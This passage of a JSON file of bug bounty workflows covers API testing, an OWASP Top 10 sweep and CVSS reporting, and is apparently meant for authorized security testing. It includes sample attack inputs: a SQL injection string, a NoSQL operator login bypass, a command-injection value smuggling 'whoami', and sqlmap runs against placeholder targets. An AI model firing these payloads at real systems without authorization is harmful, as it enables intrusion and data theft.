    "summary": "Comprehensive API security testing workflow for bug bounty programs, covering REST, GraphQL, and SOAP APIs with authentication, authorization, and business logic vulnerability assessment.",
    "details": "This workflow provides a systematic approach to API security testing in bug bounty programs. It covers API discovery, authentication testing, authorization bypass, injection vulnerabilities, business logic flaws, and API-specific attacks, with emphasis on proper evidence collection and responsible disclosure.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install API testing tools and frameworks",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y git python3 python3-pip curl jq",
            "copyable": true
          },
          {
            "detail": "pip3 install requests httpie postman-api-apikey",
            "copyable": true
          },
          {
            "detail": "pip3 install graphql-api gql",
            "copyable": true
          },
          {
            "detail": "go install -v github.com/projectdiscovery/httpx@latest",
            "copyable": true
          },
          {
            "detail": "npm install -g @apiary/apijsonschema",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install with Kali's API testing tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y burpsuite owasp-zap postman",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y sqlmap nikto gobuster nuclei",
            "copyable": true
          },
          {
            "detail": "pip3 install requests httpie graphql-client",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/API-Security/API-Checklist ~/tools/api-checklist",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker/Containerized",
        "summary": "API testing environment with specialized tools",
        "steps": [
          {
            "detail": "docker pull postman/newman",
            "copyable": true
          },
          {
            "detail": "docker pull owasp/zap2docker-stable",
            "copyable": true
          },
          {
            "detail": "docker pull api-security/api-security-checklist",
            "copyable": true
          },
          {
            "detail": "mkdir -p ~/api/{endpoints,auth,tests,evidence,reports}",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/assetnote/kiterunner ~/tools/kiterunner",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Quick API endpoint discovery",
        "command": "curl -s https://target.example.com/ | jq -r '.links[].href' 2>/dev/null || grep -E \"(api|v1|v2)\" response.txt",
        "notes": [
          "Extract API endpoints from HTML and JavaScript responses"
        ]
      },
      {
        "description": "Authentication testing",
        "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"email\":\"admin@test.com\",\"password\":\"admin\"}' https://api.target.com/auth/login",
        "notes": [
          "Test authentication endpoints with various credentials"
        ]
      },
      {
        "description": "GraphQL introspection",
        "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"query\":\"{__schema{types{name}}}\"}' https://api.target.com/graphql",
        "notes": [
          "Extract GraphQL schema for endpoint discovery"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: API Discovery & Mapping",
        "steps": [
          {
            "title": "Endpoint Discovery",
            "details": "Discover API endpoints from documentation, source code, and crawling",
            "command": "curl -s https://target.example.com/ | grep -E \"(api|v1|v2|rest|graphql)\" > api_endpoints.txt"
          },
          {
            "title": "API Documentation Analysis",
            "details": "Analyze available API documentation and specifications",
            "command": "# Review Swagger/OpenAPI docs, Postman collections, API gateways"
          },
          {
            "title": "JavaScript Analysis",
            "details": "Extract API calls from frontend JavaScript code",
            "command": "# Analyze bundled JS files, network calls, and API configurations"
          },
          {
            "title": "Mobile App API Analysis",
            "details": "Extract API endpoints from mobile applications",
            "command": "# Decompile mobile apps, analyze network traffic, extract API calls"
          }
        ]
      },
      {
        "title": "Phase 2: Authentication & Authorization Testing",
        "steps": [
          {
            "title": "Authentication Mechanism Analysis",
            "details": "Identify and test authentication mechanisms",
            "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"username\":\"test\",\"password\":\"test\"}' https://api.target.com/auth/login"
          },
          {
            "title": "Token Analysis",
            "details": "Analyze JWT tokens, API keys, and session management",
            "command": "# Decode JWT tokens, test token manipulation, analyze token expiration"
          },
          {
            "title": "Authorization Bypass Testing",
            "details": "Test for authorization bypass and privilege escalation",
            "command": "# Test with different user roles, manipulate user IDs, test admin endpoints"
          },
          {
            "title": "OAuth/OpenID Testing",
            "details": "Test OAuth/OpenID implementations for vulnerabilities",
            "command": "# Test redirect URIs, scope manipulation, token leakage"
          }
        ]
      },
      {
        "title": "Phase 3: Input Validation & Injection Testing",
        "steps": [
          {
            "title": "SQL Injection Testing",
            "details": "Test for SQL injection in API parameters and body",
            "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"id\":\"1\\' OR 1=1--\"}' https://api.target.com/users"
          },
          {
            "title": "NoSQL Injection Testing",
            "details": "Test for NoSQL injection in MongoDB and other NoSQL databases",
            "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}' https://api.target.com/auth/login"
          },
          {
            "title": "Command Injection Testing",
            "details": "Test for command injection in API parameters",
            "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"file\":\"test.txt; whoami\"}' https://api.target.com/files"
          },
          {
            "title": "XXE & XML Injection",
            "details": "Test for XXE and XML injection in XML-based APIs",
            "command": "# Test with malicious XML payloads, external entity injection"
          }
        ]
      },
      {
        "title": "Phase 4: Business Logic & Functionality Testing",
        "steps": [
          {
            "title": "Rate Limiting Testing",
            "details": "Test API rate limiting and abuse prevention",
            "command": "# Test with automated requests, parallel threads, timing attacks"
          },
          {
            "title": "Business Logic Flaws",
            "details": "Test for business logic vulnerabilities in API workflows",
            "command": "# Test price manipulation, race conditions, workflow bypasses"
          },
          {
            "title": "Mass Assignment Testing",
            "details": "Test for mass assignment vulnerabilities in object creation",
            "command": "# Test with additional parameters, role assignment, status changes"
          },
          {
            "title": "Resource Enumeration",
            "details": "Test for insecure direct object references and enumeration",
            "command": "# Test sequential IDs, UUID enumeration, resource guessing"
          }
        ]
      },
      {
        "title": "Phase 5: GraphQL & Specialized API Testing",
        "steps": [
          {
            "title": "GraphQL Introspection",
            "details": "Extract and analyze GraphQL schema and queries",
            "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"query\":\"{__schema{queryType{fields{name}}}}\"}' https://api.target.com/graphql"
          },
          {
            "title": "GraphQL Injection Testing",
            "details": "Test for GraphQL-specific injection vulnerabilities",
            "command": "# Test malicious queries, introspection abuse, field duplication"
          },
          {
            "title": "SOAP API Testing",
            "details": "Test SOAP APIs for XML-based vulnerabilities",
            "command": "# Test XXE, XML injection, WSDL analysis"
          },
          {
            "title": "WebSocket API Testing",
            "details": "Test WebSocket endpoints for authentication and injection",
            "command": "# Test WebSocket authentication, message injection, DoS"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "API Security Testing Timeline",
        "stages": [
          {
            "label": "Day 1: Discovery & Mapping",
            "description": "Complete API endpoint discovery and documentation analysis",
            "command": "curl -s https://target.example.com/ | jq -r '.links[].href' > day1_endpoints.txt"
          },
          {
            "label": "Day 2: Authentication Testing",
            "description": "Test authentication mechanisms and token security",
            "command": "# Test login endpoints, token manipulation, OAuth flows"
          },
          {
            "label": "Day 3: Injection Testing",
            "description": "Comprehensive injection testing across all endpoints",
            "command": "# SQL injection, NoSQL injection, command injection testing"
          },
          {
            "label": "Day 4: Business Logic Testing",
            "description": "Test business logic flaws and API-specific vulnerabilities",
            "command": "# Rate limiting, mass assignment, enumeration testing"
          },
          {
            "label": "Day 5: Specialized APIs & Reporting",
            "description": "Test GraphQL/SOAP APIs and prepare vulnerability report",
            "command": "# GraphQL introspection, schema analysis, report preparation"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "SQL injection successful",
        "meaning": "Database access and potential data breach",
        "severity": "Critical"
      },
      {
        "indicator": "Authentication bypass via token manipulation",
        "meaning": "Complete account compromise possible",
        "severity": "Critical"
      },
      {
        "indicator": "Unauthorized data access",
        "meaning": "Sensitive data exposure and privacy violation",
        "severity": "High"
      },
      {
        "indicator": "Rate limiting bypass",
        "meaning": "Brute force attacks and abuse possible",
        "severity": "Medium"
      },
      {
        "indicator": "GraphQL schema exposed",
        "meaning": "Complete API structure and endpoints exposed",
        "severity": "Medium"
      },
      {
        "indicator": "Mass assignment vulnerability",
        "meaning": "Privilege escalation and data manipulation possible",
        "severity": "High"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom API Fuzzing",
        "scenario": "Develop custom fuzzing payloads for API-specific testing",
        "command": "# Create custom payloads based on API specifications and business logic",
        "notes": [
          "Target application-specific data formats and validation rules"
        ]
      },
      {
        "title": "API Security Automation",
        "scenario": "Automate API testing with custom scripts and frameworks",
        "command": "# Create automated testing pipelines with continuous scanning",
        "notes": [
          "Integrate with CI/CD for ongoing API security assessment"
        ]
      },
      {
        "title": "GraphQL Query Optimization",
        "scenario": "Optimize GraphQL queries for maximum data extraction",
        "command": "# Use query batching, aliases, and fragments for efficient testing",
        "notes": [
          "Maximize GraphQL testing efficiency and coverage"
        ]
      }
    ],
    "comparison_table": {
      "caption": "API Testing Tools Comparison",
      "columns": ["Tool", "REST", "GraphQL", "SOAP", "Automation", "Best For"],
      "rows": [
        ["Burp Suite", "Excellent", "Good", "Good", "Good", "Comprehensive testing"],
        ["Postman", "Excellent", "Good", "Limited", "Excellent", "API development"],
        ["OWASP ZAP", "Good", "Limited", "Limited", "Good", "Automated scanning"],
        ["Insomnia", "Excellent", "Excellent", "Limited", "Good", "GraphQL testing"],
        ["Curl/JQ", "Good", "Good", "Limited", "Excellent", "Scripting"]
      ]
    },
    "resources": [
      {
        "label": "OWASP API Security Top 10",
        "url": "https://owasp.org/www-project-api-security/",
        "description": "Most critical API security risks"
      },
      {
        "label": "API Security Checklist",
        "url": "https://github.com/API-Security/api-security-checklist",
        "description": "Comprehensive API security testing checklist"
      },
      {
        "label": "Postman API Security",
        "url": "https://learning.postman.com/docs/postman/api-postman-api/",
        "description": "Postman API security documentation and best practices"
      },
      {
        "label": "GraphQL Security",
        "url": "https://graphql.org/learn/security/",
        "description": "GraphQL security best practices and vulnerabilities"
      }
    ]
  },
  {
    "id": "bugbounty_owasp_top10",
    "name": "Bug Bounty - OWASP Top 10 Sweep",
    "summary": "Systematic OWASP Top 10 vulnerability assessment workflow for bug bounty programs, providing comprehensive coverage of the most critical web application security risks with targeted testing and evidence collection.",
    "details": "This workflow provides a structured approach to testing for OWASP Top 10 vulnerabilities in bug bounty programs. It covers the 2021 OWASP Top 10 categories with specific testing methodologies, automated tools, and manual testing techniques to identify high-impact vulnerabilities commonly found in web applications.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install OWASP Top 10 testing tools and dependencies",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y git python3 python3-pip curl jq",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y burpsuite owasp-zap nikto sqlmap nuclei",
            "copyable": true
          },
          {
            "detail": "pip3 install requests beautifulsoup4 selenium",
            "copyable": true
          },
          {
            "detail": "go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/OWASP/OWASP-testing-guide ~/tools/owasp-guide",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install with Kali's comprehensive security tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y burpsuite owasp-zap nikto sqlmap",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y gobuster ffuf wpscan nuclei testssl",
            "copyable": true
          },
          {
            "detail": "pip3 install requests selenium webdriver-manager",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/danielmiessler/SecLists ~/wordlists",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker/Containerized",
        "summary": "OWASP Top 10 testing environment with specialized tools",
        "steps": [
          {
            "detail": "docker pull owasp/zap2docker-stable",
            "copyable": true
          },
          {
            "detail": "docker pull projectdiscovery/nuclei",
            "copyable": true
          },
          {
            "detail": "docker pull securing/docker-sqlmap",
            "copyable": true
          },
          {
            "detail": "mkdir -p ~/owasp10/{a01,a02,a03,a04,a05,a06,a07,a08,a09,a10,evidence,reports}",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/projectdiscovery/nuclei-templates ~/nuclei-templates",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "A01 - Broken Access Control test",
        "command": "curl -H \"Authorization: Bearer INVALID_TOKEN\" https://api.target.com/admin/users",
        "notes": [
          "Test for authorization bypass with invalid tokens"
        ]
      },
      {
        "description": "A03 - Injection quick test",
        "command": "sqlmap -u \"https://target.com/search?q=test\" --batch --level=1 --risk=1",
        "notes": [
          "Quick SQL injection test with safe parameters"
        ]
      },
      {
        "description": "A05 - Security Misconfiguration scan",
        "command": "nuclei -l targets.txt -t misconfig/ -severity critical,high -o misconfigs.txt",
        "notes": [
          "Scan for common security misconfigurations"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "A01: Broken Access Control",
        "steps": [
          {
            "title": "Authorization Bypass Testing",
            "details": "Test for authorization bypass in sensitive endpoints",
            "command": "# Test admin endpoints with regular user tokens, manipulate user IDs"
          },
          {
            "title": "Privilege Escalation",
            "details": "Test for privilege escalation vulnerabilities",
            "command": "# Test role manipulation, parameter pollution, metadata tampering"
          },
          {
            "title": "Insecure Direct Object References",
            "details": "Test for IDOR vulnerabilities in API endpoints",
            "command": "# Manipulate IDs, UUIDs, and object references in URLs and parameters"
          },
          {
            "title": "Bypassing Business Logic",
            "details": "Test for business logic bypasses in authorization checks",
            "command": "# Test workflow bypasses, race conditions, state manipulation"
          }
        ]
      },
      {
        "title": "A02: Cryptographic Failures",
        "steps": [
          {
            "title": "Weak Encryption Testing",
            "details": "Test for weak cryptographic implementations",
            "command": "# Test for weak ciphers, improper key management, hardcoded keys"
          },
          {
            "title": "Sensitive Data Exposure",
            "details": "Test for sensitive data in transit and at rest",
            "command": "# Check for passwords, tokens, PII in responses, logs, storage"
          },
          {
            "title": "TLS/SSL Configuration",
            "details": "Test for weak TLS/SSL configurations",
            "command": "testssl.sh https://target.example.com | grep -E \"(weak|vulnerable)\""
          },
          {
            "title": "Hash Implementation",
            "details": "Test for weak hashing algorithms and salt usage",
            "command": "# Test password storage, hash cracking, rainbow table attacks"
          }
        ]
      },
      {
        "title": "A03: Injection",
        "steps": [
          {
            "title": "SQL Injection Testing",
            "details": "Comprehensive SQL injection testing across all parameters",
            "command": "sqlmap -u \"https://target.com/search?q=test\" --batch --level=3 --risk=2"
          },
          {
            "title": "NoSQL Injection Testing",
            "details": "Test NoSQL injection in MongoDB and other NoSQL databases",
            "command": "# Test JSON-based injection, operator injection, blind NoSQL injection"
          },
          {
            "title": "Command Injection Testing",
            "details": "Test for OS command injection vulnerabilities",
            "command": "# Test semicolon injection, pipe injection, backtick injection"
          },
          {
            "title": "Template Injection Testing",
            "details": "Test for server-side template injection vulnerabilities",
            "command": "# Test Jinja2, Twig, Handlebars template injection payloads"
          }
        ]
      },
      {
        "title": "A04: Insecure Design",
        "steps": [
          {
            "title": "Business Logic Flaws",
            "details": "Test for business logic vulnerabilities in application design",
            "command": "# Test race conditions, workflow bypasses, logic flaw exploitation"
          },
          {
            "title": "Missing Authorization",
            "details": "Test for missing authorization in critical operations",
            "command": "# Test password reset, email change, account deletion without auth"
          },
          {
            "title": "Unsafe Resource Consumption",
            "details": "Test for resource exhaustion and DoS vulnerabilities",
            "command": "# Test file upload limits, request size limits, CPU/memory exhaustion"
          },
          {
            "title": "Insecure Workflows",
            "details": "Test for insecure multi-step workflows and transactions",
            "command": "# Test payment processing, user registration, data import workflows"
          }
        ]
      },
      {
        "title": "A05: Security Misconfiguration",
        "steps": [
          {
            "title": "Default Credentials Testing",
            "details": "Test for default credentials and configuration files",
            "command": "# Test admin/admin, default passwords, config file exposure"
          },
          {
            "title": "Directory Listing",
            "details": "Test for directory listing and file exposure",
            "command": "curl -I https://target.com/uploads/ | grep -E \"(200|Index of)\""
          },
          {
            "title": "Security Headers Analysis",
            "details": "Test for missing or misconfigured security headers",
            "command": "curl -I https://target.com | grep -E \"(X-Frame|X-XSS|CSP|HSTS)\""
          },
          {
            "title": "Cloud Misconfigurations",
            "details": "Test for cloud service misconfigurations",
            "command": "# Test S3 buckets, cloud storage, metadata endpoints"
          }
        ]
      },
      {
        "title": "A06: Vulnerable and Outdated Components",
        "steps": [
          {
            "title": "Software Version Detection",
            "details": "Identify outdated software and vulnerable versions",
            "command": "whatweb --log-verbose=versions.txt https://target.com && nuclei -l targets.txt -t cves/"
          },
          {
            "title": "Dependency Analysis",
            "details": "Analyze JavaScript dependencies for known vulnerabilities",
            "command": "# Test package.json, npm audit, dependency confusion"
          },
          {
            "title": "Component Exploitation",
            "details": "Test for exploitable vulnerabilities in components",
            "command": "# Test CVE exploits, public exploits, proof-of-concept attacks"
          },
          {
            "title": "Supply Chain Security",
            "details": "Test for supply chain vulnerabilities in third-party components",
            "command": "# Test dependency confusion, malicious packages, typosquatting"
          }
        ]
      },
      {
        "title": "A07: Identification and Authentication Failures",
        "steps": [
          {
            "title": "Authentication Bypass",
            "details": "Test for authentication mechanism bypasses",
            "command": "# Test SQL injection in login, JWT manipulation, session fixation"
          },
          {
            "title": "Weak Password Policies",
            "details": "Test for weak password policies and recovery mechanisms",
            "command": "# Test password complexity, reset tokens, recovery bypasses"
          },
          {
            "title": "Session Management",
            "details": "Test for insecure session management",
            "command": "# Test session fixation, hijacking, prediction, invalidation"
          },
          {
            "title": "Multi-Factor Authentication",
            "details": "Test MFA implementation for bypasses and weaknesses",
            "command": "# Test MFA bypass, backup codes, social engineering resistance"
          }
        ]
      },
      {
        "title": "A08: Software and Data Integrity Failures",
        "steps": [
          {
            "title": "Insecure Deserialization",
            "details": "Test for insecure deserialization vulnerabilities",
            "command": "# Test JSON, XML, binary deserialization attacks"
          },
          {
            "title": "Code Injection",
            "details": "Test for code injection vulnerabilities",
            "command": "# Test eval injection, template injection, expression language injection"
          },
          {
            "title": "Software Supply Chain",
            "details": "Test for software supply chain integrity issues",
            "command": "# Test CI/CD pipeline security, code signing, update mechanisms"
          },
          {
            "title": "CORS Misconfiguration",
            "details": "Test for CORS misconfiguration vulnerabilities",
            "command": "# Test wildcard origins, credential leakage, preflight cache poisoning"
          }
        ]
      },
      {
        "title": "A09: Security Logging and Monitoring Failures",
        "steps": [
          {
            "title": "Logging Deficiencies",
            "details": "Test for inadequate logging and monitoring",
            "command": "# Test log injection, log deletion, log tampering"
          },
          {
            "title": "Event Monitoring",
            "details": "Test for insufficient event monitoring and alerting",
            "command": "# Test attack detection, anomaly detection, incident response"
          },
          {
            "title": "Audit Trail Gaps",
            "details": "Test for missing or incomplete audit trails",
            "command": "# Test user action logging, data access logging, change tracking"
          },
          {
            "title": "Alerting Mechanisms",
            "details": "Test for inadequate alerting and notification systems",
            "command": "# Test alert fatigue, false positives, missed attacks"
          }
        ]
      },
      {
        "title": "A10: Server-Side Request Forgery (SSRF)",
        "steps": [
          {
            "title": "SSRF Discovery",
            "details": "Identify potential SSRF vulnerabilities",
            "command": "# Test file imports, webhooks, redirects, URL parameters"
          },
          {
            "title": "Internal Network Access",
            "details": "Test for internal network access via SSRF",
            "command": "# Test localhost access, internal IP ranges, cloud metadata"
          },
          {
            "title": "Cloud Metadata Access",
            "details": "Test for cloud metadata service access",
            "command": "# Test AWS metadata, GCP metadata, Azure metadata endpoints"
          },
          {
            "title": "Blind SSRF",
            "details": "Test for blind SSRF vulnerabilities",
            "command": "# Test out-of-band techniques, DNS exfiltration, time delays"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "OWASP Top 10 Comprehensive Assessment",
        "stages": [
          {
            "label": "Day 1: A01-A02 Critical Testing",
            "description": "Focus on Broken Access Control and Cryptographic Failures",
            "command": "# Test authorization bypass, privilege escalation, crypto failures"
          },
          {
            "label": "Day 2: A03-A04 Injection & Design",
            "description": "Comprehensive injection testing and insecure design analysis",
            "command": "sqlmap -u \"https://target.com/search?q=test\" --batch && business_logic_testing"
          },
          {
            "label": "Day 3: A05-A06 Configuration & Components",
            "description": "Security misconfigurations and vulnerable components assessment",
            "command": "nuclei -l targets.txt -t misconfig/ && nuclei -l targets.txt -t cves/"
          },
          {
            "label": "Day 4: A07-A08 Authentication & Integrity",
            "description": "Authentication failures and software integrity testing",
            "command": "# Test auth bypass, session management, deserialization attacks"
          },
          {
            "label": "Day 5: A09-A10 Monitoring & SSRF",
            "description": "Logging failures and SSRF vulnerability testing",
            "command": "# Test logging gaps, monitoring issues, SSRF exploitation"
          }
        ]
      },
      {
        "name": "Rapid OWASP Top 10 Triage",
        "stages": [
          {
            "label": "Critical Vulnerability Hunt",
            "description": "Quick scan for critical OWASP Top 10 vulnerabilities",
            "command": "nuclei -l targets.txt -severity critical -t owasp/ -o critical_owasp.txt"
          },
          {
            "label": "Authentication & Authorization",
            "description": "Test A01 and A07 vulnerabilities",
            "command": "# Test auth bypass, privilege escalation, session management"
          },
          {
            "label": "Injection Testing",
            "description": "Test A03 injection vulnerabilities",
            "command": "sqlmap -u \"https://target.com/search?q=test\" --batch --level=2"
          },
          {
            "label": "Configuration & SSRF",
            "description": "Test A05 and A10 vulnerabilities",
            "command": "# Test misconfigurations, SSRF, internal access"
          },
          {
            "label": "Evidence Collection",
            "description": "Document findings and prepare bounty submission",
            "command": "# Organize evidence, create PoC, write detailed report"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "A01 - Admin access with regular user token",
        "meaning": "Complete system compromise possible via authorization bypass",
        "severity": "Critical"
      },
      {
        "indicator": "A02 - Sensitive data in plaintext",
        "meaning": "Data breach and privacy violation risk",
        "severity": "High"
      },
      {
        "indicator": "A03 - SQL injection successful",
        "meaning": "Database access and data extraction possible",
        "severity": "Critical"
      },
      {
        "indicator": "A04 - Race condition exploited",
        "meaning": "Business logic bypass and financial impact",
        "severity": "High"
      },
      {
        "indicator": "A05 - Default credentials working",
        "meaning": "Unauthorized system access",
        "severity": "High"
      },
      {
        "indicator": "A10 - SSRF to internal services",
        "meaning": "Internal network access and data exfiltration",
        "severity": "High"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom OWASP Top 10 Templates",
        "scenario": "Develop custom Nuclei templates for application-specific OWASP Top 10 vulnerabilities",
        "command": "# Create targeted templates for custom business logic and proprietary implementations",
        "notes": [
          "Target application-specific implementations of OWASP Top 10 categories"
        ]
      },
      {
        "title": "Automated OWASP Top 10 Pipeline",
        "scenario": "Create automated testing pipeline for continuous OWASP Top 10 assessment",
        "command": "# Integrate multiple tools with custom scripts for comprehensive coverage",
        "notes": [
          "Build continuous testing pipeline for ongoing security assessment"
        ]
      },
      {
        "title": "OWASP Top 10 Exploit Chaining",
        "scenario": "Chain multiple OWASP Top 10 vulnerabilities for maximum impact",
        "command": "# Combine A01 + A03 + A10 for complete system compromise",
        "notes": [
          "Demonstrate real-world impact through vulnerability chaining"
        ]
      }
    ],
    "comparison_table": {
      "caption": "OWASP Top 10 Testing Tools Comparison",
      "columns": ["Category", "Primary Tool", "Secondary Tool", "Automation", "Manual Testing"],
      "rows": [
        ["A01 Access Control", "Burp Suite", "Postman", "Limited", "Excellent"],
        ["A02 Crypto", "TestSSL", "CryptCheck", "Good", "Good"],
        ["A03 Injection", "SQLMap", "Burp Suite", "Excellent", "Good"],
        ["A04 Insecure Design", "Manual", "Custom Scripts", "Limited", "Excellent"],
        ["A05 Misconfig", "Nuclei", "Nikto", "Excellent", "Good"],
        ["A06 Components", "Nuclei", "Snyk", "Excellent", "Limited"],
        ["A07 Auth Failures", "Burp Suite", "OWASP ZAP", "Good", "Excellent"],
        ["A08 Integrity", "Burp Suite", "Custom", "Limited", "Excellent"],
        ["A09 Logging", "Manual", "Custom", "Limited", "Good"],
        ["A10 SSRF", "Nuclei", "Manual", "Good", "Excellent"]
      ]
    },
    "resources": [
      {
        "label": "OWASP Top 10 2021",
        "url": "https://owasp.org/www-project-top-ten/",
        "description": "Official OWASP Top 10 documentation and examples"
      },
      {
        "label": "OWASP Testing Guide",
        "url": "https://owasp.org/www-project-web-security-testing-guide/",
        "description": "Comprehensive web application testing methodology"
      },
      {
        "label": "OWASP Cheat Sheet Series",
        "url": "https://cheatsheetseries.owasp.org/",
        "description": "Developer guidance for preventing OWASP Top 10 vulnerabilities"
      },
      {
        "label": "PortSwigger Web Security Academy",
        "url": "https://portswigger.net/web-security",
        "description": "Free hands-on training for OWASP Top 10 vulnerabilities"
      }
    ]
  },
  {
    "id": "bugbounty_reporting_cvss",
    "name": "Bug Bounty - Reporting & CVSS",
    "summary": "Comprehensive vulnerability reporting and CVSS scoring workflow for bug bounty programs, covering evidence collection, impact assessment, risk scoring, and professional report generation.",
    "details": "This workflow provides a systematic approach to vulnerability reporting in bug bounty programs. It covers evidence collection, CVSS scoring, impact assessment, professional report writing, and communication strategies to ensure successful bounty submissions and effective remediation guidance.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install reporting tools and CVSS calculators",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y git python3 python3-pip markdown",
            "copyable": true
          },
          {
            "detail": "pip3 install jinja2 markdown2 pillow requests",
            "copyable": true
          },
          {
            "detail": "pip3 install cvss",
            "copyable": true
          },
          {
            "detail": "npm install -g markdown-cli",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/CVEProject/cvss-calculator ~/tools/cvss-calculator",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install with Kali's reporting and documentation tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y dradis faraday markdown",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y imagemagick screenshot-tools",
            "copyable": true
          },
          {
            "detail": "pip3 install jinja2 markdown2 cvss",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/bugbountywriting/VulnerabilityReportTemplate ~/tools/report-templates",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker/Containerized",
        "summary": "Reporting environment with templates and tools",
        "steps": [
          {
            "detail": "docker pull pandoc/core",
            "copyable": true
          },
          {
            "detail": "docker pull python:3.9-slim",
            "copyable": true
          },
          {
            "detail": "mkdir -p ~/bugbounty/{reports,templates,evidence,cvss}",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/CVEProject/cvss-calculator ~/tools/cvss",
            "copyable": true
          },
          {
            "detail": "wget https://first.org/cvss/calculator/cvss-calculator.html",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Quick CVSS v3.1 calculation",
        "command": "python3 -c \"import cvss; print(cvss.CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H').score())\"",
        "notes": [
          "Calculate CVSS score for vulnerability assessment"
        ]
      },
      {
        "description": "Generate vulnerability report",
        "command": "python3 generate_report.py --template bugbounty --vulnerability sql_injection --evidence evidence/",
        "notes": [
          "Generate professional vulnerability report"
        ]
      },
      {
        "description": "Evidence organization",
        "command": "mkdir -p evidence/{screenshots,pocs,logs,traffic} && find . -name \"*.png\" -exec cp {} evidence/screenshots/ \\;",
        "notes": [
          "Organize evidence for professional reporting"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Evidence Collection & Organization",
        "steps": [
          {
            "title": "Screenshot Capture",
            "details": "Capture comprehensive screenshots of vulnerability and impact",
            "command": "# Take screenshots of vulnerability, PoC, impact, and remediation"
          },
          {
            "title": "Traffic Capture",
            "details": "Capture network traffic showing vulnerability exploitation",
            "command": "# Save HTTP requests/responses, modify headers, show exploitation"
          },
          {
            "title": "Log Collection",
            "details": "Collect relevant logs and system evidence",
            "command": "# Save application logs, error messages, system responses"
          },
          {
            "title": "Evidence Organization",
            "details": "Organize evidence in structured directory format",
            "command": "mkdir -p evidence/{vulnerability,poc,impact,remediation,screenshots,logs}"
          }
        ]
      },
      {
        "title": "Phase 2: Vulnerability Analysis & CVSS Scoring",
        "steps": [
          {
            "title": "Attack Vector Analysis",
            "details": "Analyze attack vector and complexity for CVSS scoring",
            "command": "# Determine AV (Network, Local, Physical), AC (Low, High)"
          },
          {
            "title": "Privilege Requirements",
            "details": "Assess privilege requirements and user interaction needed",
            "command": "# Determine PR (None, Low, High), UI (None, Required)"
          },
          {
            "title": "Impact Assessment",
            "details": "Assess confidentiality, integrity, and availability impact",
            "command": "# Determine C, I, A impact levels (None, Low, High)"
          },
          {
            "title": "CVSS Score Calculation",
            "details": "Calculate CVSS v3.1 base score and temporal/environmental modifiers",
            "command": "python3 -c \"import cvss; print(cvss.CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H').score())\""
          }
        ]
      },
      {
        "title": "Phase 3: Business Impact Assessment",
        "steps": [
          {
            "title": "Data Sensitivity Analysis",
            "details": "Assess sensitivity of exposed or compromised data",
            "command": "# Analyze PII, financial data, credentials, intellectual property"
          },
          {
            "title": "Business Context Evaluation",
            "details": "Evaluate business impact and potential consequences",
            "command": "# Assess financial impact, reputational damage, compliance violations"
          },
          {
            "title": "Exploitability Assessment",
            "details": "Assess ease of exploitation and attacker motivation",
            "command": "# Evaluate technical skill required, attack complexity, attacker resources"
          },
          {
            "title": "Risk Quantification",
            "details": "Quantify risk in business terms and likelihood",
            "command": "# Estimate probability of exploitation, potential damage frequency"
          }
        ]
      },
      {
        "title": "Phase 4: Professional Report Generation",
        "steps": [
          {
            "title": "Executive Summary",
            "details": "Write clear executive summary for non-technical stakeholders",
            "command": "# Summarize vulnerability, impact, and remediation in business terms"
          },
          {
            "title": "Technical Details",
            "details": "Document comprehensive technical details and reproduction steps",
            "command": "# Include URLs, parameters, payloads, and step-by-step reproduction"
          },
          {
            "title": "Remediation Guidance",
            "details": "Provide detailed remediation recommendations and best practices",
            "command": "# Suggest specific code changes, configuration updates, security controls"
          },
          {
            "title": "Evidence Integration",
            "details": "Integrate evidence and screenshots into report",
